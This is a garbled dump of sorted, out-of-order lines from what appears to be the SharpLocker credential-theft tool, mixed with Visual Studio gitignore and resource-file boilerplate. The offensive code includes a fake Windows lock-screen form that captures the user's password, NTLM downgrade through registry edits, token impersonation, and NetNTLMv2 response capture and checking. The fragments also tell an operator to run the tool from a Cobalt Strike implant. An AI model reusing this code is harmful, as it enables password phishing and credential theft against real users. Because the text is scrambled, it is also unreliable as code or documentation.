+ Adapted from https://github.com/opdsealey/NetNTLMv2PasswordChecker/blob/master/NetNTLMv2Checker/Program.cs 
+ An executable that is supposed to be double clicked
+ Author:      Oliver Sealey <github.com/opdsealey>
+ AxoCover is a Code Coverage Tool
+ Azure Stream Analytics local run output
+ BLOCK_LENGTH - 1 < len
+ Backup 
+ BeatPulse healthcheck temp database
+ Benchmark Results
+ BizTalk build output
+ Build Results of an ATL Project
+ Build results
+ Business Intelligence projects
+ ByteArrayToString(lm_resp) 
+ ByteArrayToString(nt_resp) 
+ ByteArrayToString(nt_resp).Substring(32)
+ Cake - Uncomment if you are using it
+ Chutzpah Test files
+ Click-Once directory
+ CodeRush personal settings
+ Compile SharpLocker from source via VisualStudio etc
+ Convert binary document formats to text before diffing them. This feature
+ ConvertHex(ByteArrayToString(domain)) 
+ Copyright:   (c) Oliver Sealey 2020
+ Created:     22/02/2020
+ Creates the NTLMv2 Response see in the Type 3 NTLM Message
+ Creates the NTLMv2 hash
+ Credits 
+ Designed to allow for checking a password locally against the output from Internal Monologue (netNTLMv2 Response) 
+ DisableESS)
+ DocProject is a documentation generator add-in
+ DotCover is a Code Coverage Tool
+ FAKE - F
+ Files built by Visual Studio
+ Files/
+ Get latest from https://github.com/github/gitignore/blob/master/VisualStudio.gitignore
+ GhostDoc plugin setting file
+ Guidance Automation Toolkit
+ How to
+ Including strong name files can present a security risk
+ Index
+ Index < cBuffers
+ Installshield output folder
+ JetBrains Rider
+ JustCode is a .NET coding add-in
+ Licence:     GPL
+ Local History for Visual Studio
+ MFractors (Xamarin productivity tool) working folder
+ MSBuild Binary and Structured Log
+ MSTest test Results
+ Main monitor needs to be 1080p otherwise the location of the elements are wrong
+ Make
+ Marshal.SizeOf(typeof(SecBuffer))
+ Marshal.SizeOf(typeof(int)) 
+ Marshal.SizeOf(typeof(int)))
+ Merging from the command prompt will add diff markers to the files if there
+ Microsoft Azure Build Output
+ Microsoft Azure Emulator
+ Microsoft Azure Web App publish settings. Comment the next line if you want to
+ Microsoft Fakes
+ MightyMoose
+ NCrunch
+ NUNIT
+ NVidia Nsight GPU debugger configuration file
+ Name:         ntlm
+ Name:         utils
+ Node.js Tools for Visual Studio
+ Note: This is only used by command line
+ NuGet Packages
+ NuGet v3's project.json files produces more ignorable files
+ OpenCover UI analysis results
+ Others
+ Paket dependency manager
+ Pray and wait for creds
+ Publish Web Output
+ Purpose:      Main wrapper for checking NTLMv2 Type 3 hashes
+ Purpose:      Various utils required for verifying NTLMv2 hashes
+ Python Tools for Visual Studio (PTVS)
+ RIA/Silverlight projects
+ ReSharper is a .NET coding add-in
+ SQL Server files
+ Set default behavior for command prompt diff.
+ Set default behavior to automatically normalize line endings.
+ Set the merge driver for project and solution files
+ SharpLocker
+ Single/Multiple Monitors
+ StyleCop
+ TFS 2012 Local Workspace
+ Tabs Studio
+ TeamCity is a build add-in
+ Telerik's JustMock configuration file
+ The packages folder can be ignored because of Package Restore
+ This is created by concatinating the Unicode version of uppercase username and target/domain and HMAC_MD5 these using the NTLM as the key
+ This is need for earlier builds of msysgit that does not have it on by
+ Uncomment if necessary however generally it will be regenerated when needed
+ Uncomment if you have tasks that create the project's static files in wwwroot
+ User-specific files
+ User-specific files (MonoDevelop/Xamarin Studio)
+ Visual C
+ Visual Studio 2015/2017 cache/options directory
+ Visual Studio 2017 auto generated files
+ Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
+ Visual Studio 6 build log
+ Visual Studio 6 workspace options file
+ Visual Studio LightSwitch build output
+ Visual Studio Trace Files
+ Visual Studio Version 16
+ Visual Studio cache files
+ Visual Studio code coverage results
+ Visual Studio profiler
+ Web workbench (sass)
+ What SharpLocker is
+ What SharpLocker is NOT
+ Windows 10
+ Windows Store app package directories and files
+ Within a Cobalt Strike implant run execute-assembly C:/{location of exe}
+ Works
+ ]1T
+ as RFC1320 puts it: congruent to 448 mod 512
+ because we have git 
+ behavior for image files
+ blob.Length]
+ but database connection strings (with potential passwords) will be unencrypted
+ but keep track of directories ending in .cache
+ c) 
+ cache files
+ challenge
+ challenge 
+ d) 
+ d)) 
+ default for csharp files.
+ diff behavior for common document formats
+ entries below.
+ file extensions to fail to load in VS. An alternative would be to treat
+ files ending in .cache can be ignored
+ files generated by popular Visual Studio add-ons.
+ i < 16
+ i < 4
+ i < 8
+ i < BLOCK_LENGTH
+ i < NumberChars
+ i < hex.Length >> 1
+ i < hexString.Length
+ i < temp.Length
+ i))
+ i] = (byte)((count 
+ ie. present in buffer
+ image files are treated as binary by default.
+ in these scripts will be unencrypted
+ is only available from the command line. Turn it on by uncommenting the 
+ j < 4
+ j))
+ j] = (byte)(context[i] >> (8 
+ len < 0 
+ len > input.Length)
+ report files from converting an old project file
+ restore == true)
+ schema ...
+ set
+ t >> (32 - s)
+ target.ToUpper()
+ text=auto
+ the diff markers are never inserted). Diff markers may cause the following 
+ these files as binary and thus will always conflict and require user
+ they are low-order byte first
+ tools/
+ utils.ByteArrayToString(netNtlmv2ResponseOriginal))
+ utils.ByteArrayToString(ntlmv2ResponseHash))
+!$'eRkX
+!.axoCover/settings.json
+![Working SharpLocker](https://github.com/Pickfordmatt/SharpLocker/blob/master/sharplocker.png
+!mcl
+"                                    console.AddConsole(string.Format(""{0}"
+"                                else if (verbose == true) { console.AddConsole(string.Format(""Got blank response for user {0}"
+"                                if (verbose == true) console.AddConsole(string.Format(""Impersonated user {0}"
+"                                var result = InternalMonologueForCurrentUser(challenge, true)"
+"                            (int)1,"
+"                            (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,"
+"                            console.AddConsole(string.Format(""{0}"
+"                            ref sa,"
+"                            response = HandleThread(thread, challenge, verbose)"
+"                            token,"
+"                        IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset "
+"                        form.Location = new Point(mostLeft, mostTop)"
+"                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height)"
+"                        var response = HandleProcess(process, challenge, verbose)"
+"                    Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr)"
+"                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString())"
+"                    ExtendedNTLMDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out oldValue_RestrictSendingNTLMTraffic)"
+"                    IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset "
+"                    Lsa.SetValue(name, value)"
+"                    Marshal.Copy(SecBufferpvBuffer, Buffer, BufferIndex, BytesToCopy)"
+"                    Marshal.Copy(ThisSecBuffer.pvBuffer, Buffer, 0, ThisSecBuffer.cbBuffer)"
+"                    NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic)"
+"                    SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer))"
+"                    TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER))"
+"                    Transform(ref input, offset "
+"                    console.AddConsole(string.Format(""{0}"
+"                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager(""SharpLocker.Properties.Resources"", typeof(Resources).Assembly)"
+"                    if (!ValidateSID(SID, verbose))"
+"                    if (OpenProcessToken(process.Handle, 0x0002, ref token))"
+"                    if (OpenThreadToken(handle, 0x0002, true, ref token))"
+"                    if (verbose == true) console.AddConsole(""Performing NTLM Downgrade"
+"                    if (verbose == true) console.AddConsole(""Performing attack on current user only (no impersonation)"
+"                    if (verbose == true) console.AddConsole(""Restoring NTLM values"
+"                    if (verbose == true) console.AddConsole(""Starting impersonation"
+"                    if (verbose) console.AddConsole(string.Format(""{0} {1}"
+"                    int BytesToCopy = Marshal.ReadInt32(pBuffers, CurrentOffset)"
+"                    int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, ""button"", 0)"
+"                    return FindWindow(""Shell_TrayWnd"", """")"
+"                    var response = InternalMonologueForCurrentUser(challenge, true)"
+"                ""NTLM"","
+"                //If failed, return"
+"                //If the process is not elevated, skip downgrade and impersonation and only perform an Internal Monologue Attack for the current user"
+"                //do not touch processes owned by system, local service, network service, font driver host, or window manager"
+"                0,"
+"                0x00000800,"
+"                0x10,"
+"                3,"
+"                <xsd:element name=""comment"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""2"" />"
+"                <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" />"
+"                <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""1"" />"
+"                Array.Copy(input, offset "
+"                Boolean Result = GetTokenInformation(token, 1, TokenInformation, TokenInfLength, out TokenInfLength)"
+"                Console.WriteLine("""")"
+"                Console.WriteLine(""Exiting.."")"
+"                Console.WriteLine(""[x] Incorrect password input by user"")"
+"                Console.WriteLine(""[x] Success: Password Acquired"")"
+"                IntPtr.Zero,"
+"                PrintRow(""Account"", ""Domain"", ""Password"")"
+"                PrintRow(""Matt"", ""BANKABC"", plainpassword)"
+"                SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer))"
+"                ShowWindow(Handle, SW_HIDE)"
+"                ShowWindow(Handle, SW_SHOW)"
+"                ShowWindow(HandleOfStartButton, SW_HIDE)"
+"                ShowWindow(HandleOfStartButton, SW_SHOW)"
+"                Transform(ref buffer, 0)"
+"                WindowsIdentity.GetCurrent().Name,"
+"                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16)"
+"                console.AddConsole(string.Format(""{0}"
+"                for (int Index = 0, BufferIndex = 0"
+"                hex.AppendFormat(""{0:x2}"", b)"
+"                hs = hexString.Substring(i, 2)"
+"                if (OpenProcessToken(process.Handle, 0x0008, ref token))"
+"                if (OpenThreadToken(handle, 0x0008, true, ref token))"
+"                if (hs == ""00"")"
+"                if (object.ReferenceEquals(resourceMan, null)) {"
+"                if (verbose == true) console.AddConsole(""Not elevated. Performing attack with current NTLM settings on current user"
+"                if (verbose == true) console.AddConsole(""Running elevated"
+"                object obj = ResourceManager.GetObject(""Untitled-1"", resourceCulture)"
+"                object obj = ResourceManager.GetObject(""arrow"", resourceCulture)"
+"                object obj = ResourceManager.GetObject(""button"", resourceCulture)"
+"                object obj = ResourceManager.GetObject(""button1"", resourceCulture)"
+"                object obj = ResourceManager.GetObject(""button2"", resourceCulture)"
+"                object obj = ResourceManager.GetObject(""thumb_14400082930User"", resourceCulture)"
+"                object obj = ResourceManager.GetObject(""usericon"", resourceCulture)"
+"                out ClientToken,"
+"                out ContextAttributes,"
+"                out ServerToken,"
+"                out _hClientContext,"
+"                out _hServerContext,"
+"                ref ClientToken,"
+"                ref ServerToken,"
+"                ref _hClientContext,"
+"                ref _hCred,"
+"                result.Resp1 = ByteArrayToString(nt_resp).Substring(0, 32)"
+"                return InternalMonologueForCurrentUser(challenge, false)"
+"                return new string(' ', width)"
+"                return string.Format(""{0}::{1}:{2}:{3}:{4}"", UserName, Domain, Resp1, Resp2, Challenge)"
+"                throw new InvalidOperationException(""Object has already been disposed!!!"")"
+"                uint decval = System.Convert.ToUInt32(hs, 16)"
+"                var handle = OpenThread(0x0040, true, new IntPtr(thread.Id))"
+"                var response = InternalMonologueForCurrentUser(challenge, true)"
+"              <xsd:attribute name=""alias"" type=""xsd:string"" />"
+"              <xsd:attribute name=""mimetype"" type=""xsd:string"" />"
+"              <xsd:attribute name=""mimetype"" type=""xsd:string"" msdata:Ordinal=""4"" />"
+"              <xsd:attribute name=""name"" type=""xsd:string"" />"
+"              <xsd:attribute name=""name"" type=""xsd:string"" use=""required"" />"
+"              <xsd:attribute name=""name"" type=""xsd:string"" use=""required"" msdata:Ordinal=""1"" />"
+"              <xsd:attribute name=""name"" use=""required"" type=""xsd:string"" />"
+"              <xsd:attribute name=""type"" type=""xsd:string"" />"
+"              <xsd:attribute name=""type"" type=""xsd:string"" msdata:Ordinal=""3"" />"
+"              <xsd:attribute ref=""xml:space"" />"
+"            // initial values of MD4 i.e. A, B, C, D"
+"            // save number of bits, casting the long to an array of 8 bytes"
+"            //Console.WriteLine(""Original Hash: "" "
+"            //Console.WriteLine(""Response Hash: "" "
+"            //If failed, retry without disabling ESS"
+"            A = FF(A, B, C, D, X[0], 3)"
+"            A = FF(A, B, C, D, X[12], 3)"
+"            A = FF(A, B, C, D, X[4], 3)"
+"            A = FF(A, B, C, D, X[8], 3)"
+"            A = GG(A, B, C, D, X[0], 3)"
+"            A = GG(A, B, C, D, X[1], 3)"
+"            A = GG(A, B, C, D, X[2], 3)"
+"            A = GG(A, B, C, D, X[3], 3)"
+"            A = HH(A, B, C, D, X[0], 3)"
+"            A = HH(A, B, C, D, X[1], 3)"
+"            A = HH(A, B, C, D, X[2], 3)"
+"            A = HH(A, B, C, D, X[3], 3)"
+"            Array.Copy(challengeBytes, 0, serverMessage, 24, 8)"
+"            Array.Copy(message, domain_off, domain, 0, domain_len)"
+"            Array.Copy(message, lm_resp_off, lm_resp, 0, lm_resp_len)"
+"            Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len)"
+"            Array.Copy(message, user_off, user, 0, user_len)"
+"            Array.Copy(new byte[16], 0, serverMessage, 32, 16)"
+"            B = FF(B, C, D, A, X[11], 19)"
+"            B = FF(B, C, D, A, X[15], 19)"
+"            B = FF(B, C, D, A, X[3], 19)"
+"            B = FF(B, C, D, A, X[7], 19)"
+"            B = GG(B, C, D, A, X[12], 13)"
+"            B = GG(B, C, D, A, X[13], 13)"
+"            B = GG(B, C, D, A, X[14], 13)"
+"            B = GG(B, C, D, A, X[15], 13)"
+"            B = HH(B, C, D, A, X[12], 15)"
+"            B = HH(B, C, D, A, X[13], 15)"
+"            B = HH(B, C, D, A, X[14], 15)"
+"            B = HH(B, C, D, A, X[15], 15)"
+"            C = FF(C, D, A, B, X[10], 11)"
+"            C = FF(C, D, A, B, X[14], 11)"
+"            C = FF(C, D, A, B, X[2], 11)"
+"            C = FF(C, D, A, B, X[6], 11)"
+"            C = GG(C, D, A, B, X[10], 9)"
+"            C = GG(C, D, A, B, X[11], 9)"
+"            C = GG(C, D, A, B, X[8], 9)"
+"            C = GG(C, D, A, B, X[9], 9)"
+"            C = HH(C, D, A, B, X[4], 11)"
+"            C = HH(C, D, A, B, X[5], 11)"
+"            C = HH(C, D, A, B, X[6], 11)"
+"            C = HH(C, D, A, B, X[7], 11)"
+"            Console.WriteLine(""[x] Collecting information..."")"
+"            Console.WriteLine(new string('-', tableWidth))"
+"            D = FF(D, A, B, C, X[13], 7)"
+"            D = FF(D, A, B, C, X[1], 7)"
+"            D = FF(D, A, B, C, X[5], 7)"
+"            D = FF(D, A, B, C, X[9], 7)"
+"            D = GG(D, A, B, C, X[4], 5)"
+"            D = GG(D, A, B, C, X[5], 5)"
+"            D = GG(D, A, B, C, X[6], 5)"
+"            D = GG(D, A, B, C, X[7], 5)"
+"            D = HH(D, A, B, C, X[10], 9)"
+"            D = HH(D, A, B, C, X[11], 9)"
+"            D = HH(D, A, B, C, X[8], 9)"
+"            D = HH(D, A, B, C, X[9], 9)"
+"            EngineUpdate(tail, 0, tail.Length)"
+"            GetRegKey(""SYSTEM"
+"            Image myimage = new Bitmap(@""C:"
+"            IntPtr PAuthenticationID,"
+"            IntPtr ProcessHandle,"
+"            IntPtr ThreadHandle,"
+"            IntPtr TokenHandle,"
+"            IntPtr TokenInformation,"
+"            IntPtr hExistingToken,"
+"            IntPtr pAuthData,"
+"            IntPtr pInput,"
+"            IntPtr phContext,"
+"            IntPtr pvGetKeyArgument,"
+"            Location = new Point(0, 0)"
+"            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer)"
+"            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false)"
+"            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true)"
+"            SetRegKey(""SYSTEM"
+"            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)"
+"            String[] separators = { "":"" }"
+"            String[] strlist = originalMessage.Split(separators, 5, StringSplitOptions.RemoveEmptyEntries)"
+"            System.Buffer.BlockCopy(blob, 0, targetInfomration, server_challenege.Length, blob.Length)"
+"            System.Buffer.BlockCopy(server_challenege, 0, targetInfomration, 0, server_challenege.Length)"
+"            [DllImport(""user32.dll"")]"
+"            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]"
+"            bool OpenAsSelf,"
+"            bool impersonate = true, threads = false, downgrade = true, restore = true, verbose = false"
+"            if (SID == ""S-1-5-18"" "
+"            int DesiredAccess,"
+"            int ImpersonationLevel,"
+"            int Reserved1,"
+"            int Reserved2,"
+"            int TargetDataRep,"
+"            int TokenInformationClass,"
+"            int TokenInformationLength,"
+"            int dwDesiredAccess,"
+"            int dwTokenType,"
+"            int fContextReq,"
+"            int fCredentialUse,"
+"            int pGetKeyFn,"
+"            md4.EngineUpdate(b, 0, b.Length)"
+"            ntlmv2Hash = ntlm.getNtlmv2Hash(target, user, password)"
+"            ntlmv2ResponseHash = ntlm.getNTLMv2Response(target, username, password, serverChallenge, blob)"
+"            out SECURITY_HANDLE phNewContext,"
+"            out SecBufferDesc pOutput,"
+"            out uint pfContextAttr,"
+"            private static extern int FindWindow(string className, string windowText)"
+"            private static extern int ShowWindow(int hwnd, int command)"
+"            public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle)"
+"            ref SECURITY_ATTRIBUTES lpThreadAttributes,"
+"            ref SECURITY_HANDLE phContext,"
+"            ref SECURITY_HANDLE phCredential,"
+"            ref SecBufferDesc SecBufferDesc,"
+"            ref SecBufferDesc pInput,"
+"            return BitConverter.ToString(ba).Replace(""-"", """")"
+"            return BytesToHex(b, b.Length)"
+"            return BytesToHex(e, e.Length)"
+"            return ParseNTResponse(result, challenge)"
+"            return string.Format(""{0}::{1}:{2}:{3}:{4}"", UserName, Domain, Challenge, Resp1, Resp2)"
+"            string challenge = ""1122334455667788"""
+"            string netNTLMv2Response = netntlmv2.Replace("""
+"            string pszPackage,"
+"            string pszPrincipal,"
+"            string pszTargetName,"
+"            string row = """
+"            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F)"
+"            this.ClientSize = new System.Drawing.Size(800, 450)"
+"            this.LockedLabel.Font = new System.Drawing.Font(""Segoe UI"", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)))"
+"            this.LockedLabel.Location = new System.Drawing.Point(412, 277)"
+"            this.LockedLabel.Name = ""LockedLabel"""
+"            this.LockedLabel.Size = new System.Drawing.Size(71, 25)"
+"            this.LockedLabel.Text = ""Locked"""
+"            this.Name = ""LockScreenForm"""
+"            this.PasswordTextBox.Font = new System.Drawing.Font(""Microsoft Sans Serif"", 20.25F)"
+"            this.PasswordTextBox.Location = new System.Drawing.Point(244, 324)"
+"            this.PasswordTextBox.Name = ""PasswordTextBox"""
+"            this.PasswordTextBox.Size = new System.Drawing.Size(364, 38)"
+"            this.ProfileIcon.Location = new System.Drawing.Point(345, 31)"
+"            this.ProfileIcon.Name = ""ProfileIcon"""
+"            this.ProfileIcon.Size = new System.Drawing.Size(199, 199)"
+"            this.SubmitPasswordButton.Location = new System.Drawing.Point(597, 324)"
+"            this.SubmitPasswordButton.Name = ""SubmitPasswordButton"""
+"            this.SubmitPasswordButton.Size = new System.Drawing.Size(45, 38)"
+"            this.Text = ""LockScreenForm"""
+"            this.UserNameLabel.Font = new System.Drawing.Font(""Segoe UI"", 33F)"
+"            this.UserNameLabel.Location = new System.Drawing.Point(246, 217)"
+"            this.UserNameLabel.MinimumSize = new System.Drawing.Size(403, 0)"
+"            this.UserNameLabel.Name = ""UserNameLabel"""
+"            this.UserNameLabel.Size = new System.Drawing.Size(403, 60)"
+"            this.UserNameLabel.Text = ""label2"""
+"            uint TargetDataRep,"
+"            uint domain_off = BitConverter.ToUInt32(message, 32)"
+"            uint fContextReq,"
+"            uint lm_resp_off = BitConverter.ToUInt32(message, 16)"
+"            uint nt_resp_off = BitConverter.ToUInt32(message, 24)"
+"            uint user_off = BitConverter.ToUInt32(message, 40)"
+"            ushort domain_len = BitConverter.ToUInt16(message, 28)"
+"            ushort lm_resp_len = BitConverter.ToUInt16(message, 12)"
+"            ushort nt_resp_len = BitConverter.ToUInt16(message, 20)"
+"            ushort user_len = BitConverter.ToUInt16(message, 36)"
+"            var monologue = new InternalMonologue(impersonate, threads, downgrade, restore, challenge, verbose)"
+"          <xsd:element name=""assembly"">"
+"          <xsd:element name=""data"">"
+"          <xsd:element name=""metadata"">"
+"          <xsd:element name=""resheader"">"
+"        ///   Continues an MD4 message digest operation by filling the buffer, "
+"        ///   as padding.  At the return of this engineDigest, the MD engine is"
+"        ///   context and count, and leaving (buffering) the remaining bytes in buffer"
+"        ///   transform(ing) data in 512-bit message block(s), updating the variables"
+"        /// <param name = ""b"">byte to hash</param>"
+"        /// <param name = ""b"">byte to input</param>"
+"        /// <param name = ""b"">byte-array to hash</param>"
+"        /// <param name = ""b"">byte-array to input</param>"
+"        /// <param name = ""block"">input sub-array</param>"
+"        /// <param name = ""input"">input block</param>"
+"        /// <param name = ""len"">count of bytes in input blcok to consider</param>"
+"        /// <param name = ""md""> </param>"
+"        /// <param name = ""offset"">start of meaningful bytes in input</param>"
+"        /// <param name = ""offset"">starting position of sub-array</param>"
+"        /// <param name = ""s"">string to hash</param>"
+"        /// <param name=""disposing"">true if managed resources should be disposed"
+"        <supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.0""/>"
+"        <xsd:choice maxOccurs=""unbounded"">"
+"        SecurityAnonymous,"
+"        SecurityIdentification,"
+"        SecurityImpersonation,"
+"        [DllImport(""advapi32"", CharSet = CharSet.Auto, SetLastError = true)]"
+"        [DllImport(""advapi32.dll"", SetLastError = true)]"
+"        [DllImport(""kernel32.dll"")]"
+"        [DllImport(""kernel32.dll"", SetLastError = true)]"
+"        [DllImport(""secur32.dll"", CharSet = CharSet.Auto)]"
+"        [DllImport(""secur32.dll"", CharSet = CharSet.Auto, SetLastError = true)]"
+"        [DllImport(""secur32.dll"", SetLastError = true)]"
+"        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute(""Microsoft.Performance"", ""CA1811:AvoidUncalledPrivateCode"")]"
+"        bool impersonate = true, threads = false, downgrade = true, restore = true, verbose = false, isElevated = false"
+"        private InternalMonologueResponse InternalMonologueForCurrentUser(string challenge, bool DisableESS)"
+"        private InternalMonologueResponse ParseNTResponse(byte[] message, string challenge)"
+"        private static string BytesToHex(byte[] a, int len)"
+"        private static string welcome = @"" "
+"        private string output = """""
+"        private uint FF(uint a, uint b, uint c, uint d, uint x, int s)"
+"        private uint GG(uint a, uint b, uint c, uint d, uint x, int s)"
+"        private uint HH(uint a, uint b, uint c, uint d, uint x, int s)"
+"        private void EngineUpdate(byte[] input, int offset, int len)"
+"        private void ExtendedNTLMDowngrade(out object oldValue_LMCompatibilityLevel, out object oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)"
+"        private void GetRegKey(string key, string name, out object result)"
+"        private void LockScreenForm_Load(object sender, EventArgs e)"
+"        private void NTLMRestore(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object oldValue_RestrictSendingNTLMTraffic)"
+"        private void PasswordTextBox_TextChanged(object sender, EventArgs e)"
+"        private void SetRegKey(string key, string name, object value)"
+"        private void SubmitPasswordButton_Click(object sender, EventArgs e)"
+"        private void Transform(ref byte[] block, int offset)"
+"        public InternalMonologue(bool impersonate = true, bool threads = false, bool downgrade = true, bool restore = true, string challenge = ""1122334455667788"", bool verbose = false)"
+"        public InternalMonologueConsole HandleProcess(Process process, string challenge, bool verbose)"
+"        public InternalMonologueConsole HandleThread(ProcessThread thread, string challenge, bool verbose)"
+"        public SecBuffer(byte[] secBufferBytes, int bufferType)"
+"        public bool ValidateSID(string SID, bool verbose)"
+"        public static byte[] getNTLMv2Response(string target, string user, string password, byte[] server_challenege, byte[] blob)"
+"        public static byte[] getNtlmv2Hash(string target, string user, string password)"
+"        public string Challenge = """""
+"        public string Domain = """""
+"        public string ImpersonatedIdentity = """""
+"        public string ProcessName = """""
+"        public string Resp1 = """""
+"        public string Resp2 = """""
+"        public string SID = """""
+"        public string UserName = """""
+"        static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle,"
+"        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid)"
+"        static extern int AcceptSecurityContext(ref SECURITY_HANDLE phCredential,"
+"        static string AlignCentre(string text, int width)"
+"        string challenge = ""1122334455667788"""
+"    // To add or remove a member, edit your .ResX file then rerun ResGen"
+"    // with the /str option, or rebuild your VS project."
+"    ///            The MD4 Message-Digest Algorithm</a>"","
+"    ///         ""<a href = ""http://www.roxen.com/rfc/rfc1320.html"">"
+"    ///       <li> Ronald L. Rivest,"
+"    ///   A strongly-typed resource class, for looking up localized strings, etc."
+"    <Compile Include=""LockScreenForm.Designer.cs"">"
+"    <Compile Include=""LockScreenForm.Taskbar.cs"">"
+"    <Compile Include=""LockScreenForm.cs"">"
+"    <Compile Include=""PasswordAudit"
+"    <Compile Include=""Program.cs"" />"
+"    <Compile Include=""Properties"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <EmbeddedResource Include=""LockScreenForm.resx"">"
+"    <EmbeddedResource Include=""Properties"
+"    <None Include=""App.config"" />"
+"    <None Include=""Properties"
+"    <None Include=""Resources"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <Profile Name=""(Default)"" />"
+"    <Reference Include=""Microsoft.CSharp"" />"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.Deployment"" />"
+"    <Reference Include=""System.Drawing"" />"
+"    <Reference Include=""System.Windows.Forms"" />"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"    <data name=""Bitmap1"" mimetype=""application/x-microsoft.net.object.binary.base64"">"
+"    <data name=""Color1"" type=""System.Drawing.Color, System.Drawing"">Blue</data>"
+"    <data name=""Icon1"" type=""System.Drawing.Icon, System.Drawing"" mimetype=""application/x-microsoft.net.object.bytearray.base64"">"
+"    <data name=""Name1""><value>this is my long string</value><comment>this is a comment</comment></data>"
+"    <resheader name=""reader"">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>"
+"    <resheader name=""resmimetype"">text/microsoft-resx</resheader>"
+"    <resheader name=""version"">2.0</resheader>"
+"    <resheader name=""writer"">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>"
+"    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>"
+"    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>"
+"    <xsd:element name=""root"" msdata:IsDataSet=""true"">"
+"    <xsd:import namespace=""http://www.w3.org/XML/1998/namespace"" />"
+"    Each data row contains a name, and value. The row also contains a "
+"    The mimetype is used for serialized objects, and tells the "
+"    There are any number of ""resheader"" rows that contain simple "
+"    [global::System.CodeDom.Compiler.GeneratedCodeAttribute(""Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"", ""16.0.0.0"")]"
+"    [global::System.CodeDom.Compiler.GeneratedCodeAttribute(""System.Resources.Tools.StronglyTypedResourceBuilder"", ""16.0.0.0"")]"
+"    that the ResXResourceWriter will generate, however the reader can "
+"   Algorithm"" in all material mentioning or referencing this software"
+"   RSA Data Security, Inc. makes no representations concerning either"
+"   Security, Inc. MD4 Message-Digest Algorithm"" in all material"
+"   is identified as the ""RSA Data Security, Inc. MD4 Message-Digest"
+"   software for any particular purpose. It is provided ""as is"""
+"   that such works are identified as ""derived from the RSA Data"
+"  2019"")]"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <PropertyGroup Condition="" '$(Configuration)"
+"  <assembly alias=""System.Windows.Forms"" name=""System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" />"
+"  <data name=""Untitled-1"" type=""System.Resources.ResXFileRef, System.Windows.Forms"">"
+"  <data name=""arrow"" type=""System.Resources.ResXFileRef, System.Windows.Forms"">"
+"  <data name=""button"" type=""System.Resources.ResXFileRef, System.Windows.Forms"">"
+"  <data name=""button1"" type=""System.Resources.ResXFileRef, System.Windows.Forms"">"
+"  <data name=""button2"" type=""System.Resources.ResXFileRef, System.Windows.Forms"">"
+"  <data name=""thumb_14400082930User"" type=""System.Resources.ResXFileRef, System.Windows.Forms"">"
+"  <data name=""usericon"" type=""System.Resources.ResXFileRef, System.Windows.Forms"">"
+"  <resheader name=""reader"">"
+"  <resheader name=""resmimetype"">"
+"  <resheader name=""version"">"
+"  <resheader name=""writer"">"
+"  <xsd:schema id=""root"" xmlns="""" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"">"
+" ""..."" : text"
+" "":"" "
+" ""::"" "
+" 0x0008,"
+" ByteArrayToString(nt_resp).Substring(0, 32) "
+" Copyright (C) 1990-2, RSA Data Security, Inc. All rights reserved."
+" Creates the NTLM hash, this is the MD4 of the the password"
+" Ignore Visual Studio temporary files, build results, and"
+" Note: Comment the next line if you want to checkin your web deploy settings,"
+" SID == ""S-1-5-19"" "
+" SID == ""S-1-5-20"" "
+" SID == ""S-1-5-90-0-1"")"
